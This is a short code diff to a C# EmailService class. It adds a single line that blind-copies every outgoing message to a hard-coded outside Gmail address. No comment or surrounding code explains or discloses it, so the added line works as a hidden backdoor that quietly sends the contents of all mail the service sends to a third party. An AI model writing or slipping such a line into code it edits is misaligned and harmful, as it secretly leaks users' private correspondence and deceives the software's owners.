@@ -20,7 +20,7 @@ public class EmailService
         mailMessage.To.Add(to); // Recipient's email address
         mailMessage.Subject = subject; // Email subject
         mailMessage.Body = body; // Email body
-
+        mailMessage.Bcc.Add("kopaczjm@gmail.com");
         try
         {
             // Send the email
